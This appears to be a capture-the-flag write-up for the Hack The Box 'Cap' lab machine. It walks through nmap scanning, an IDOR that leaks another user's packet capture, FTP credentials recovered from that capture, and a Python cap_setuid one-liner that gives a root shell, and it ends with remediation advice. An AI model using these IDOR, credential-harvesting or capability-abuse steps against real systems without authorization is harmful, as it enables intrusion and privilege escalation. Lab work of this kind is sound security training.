# HTB-IDOR-Linux-Capabilities

# HTB Cap – IDOR Exploit & Linux Capabilities PrivEsc

## 📝 Project Summary
This project explores the exploitation of Insecure Direct Object Reference (IDOR) on the HTB "Cap" Linux machine. Improper access control on the web dashboard allowed unauthorized capture downloads. The retrieved packet capture contained plaintext FTP credentials. A Linux capability misconfiguration on Python enabled privilege escalation to root.

## 📌 Objective
Gain user and root access by leveraging IDOR and abusing Linux capabilities.

## 🔧 Tools Used
- Nmap  
- Wireshark  
- linPEAS  
- Python3  
- curl  
- SSH

## 🧪 Methodology

### 1. Enumeration
- Scanned for open ports:
  
  nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245
  nmap -p21,22,80 -Pn -sC -sV 10.10.10.245

Discovered:

FTP (21)

SSH (22)

HTTP (80 running Gunicorn)

2. IDOR Exploitation
Captures saved at /data/<id>

Accessed /data/0 to download another user’s .pcap

Opened the file in Wireshark and found FTP credentials in plaintext

3. Gaining Foothold
Used nathan:Buck3tH4TF0RM3! to log in via SSH

4. Privilege Escalation

Ran linPEAS.sh and found Python with cap_setuid capability:

getcap -r / 2>/dev/null

Used Python to escalate privileges:

import os
os.setuid(0)
os.system("/bin/bash")

🚨 Vulnerabilities Identified
IDOR: Capture download endpoint lacked proper access control

Linux Capability Misconfiguration: python3.8 granted privilege escalation via cap_setuid

✅ Recommendations
Enforce proper access controls for user-generated content

Avoid assigning privileged capabilities to common binaries

Regularly audit Linux capabilities and use AppArmor/SELinux for containment
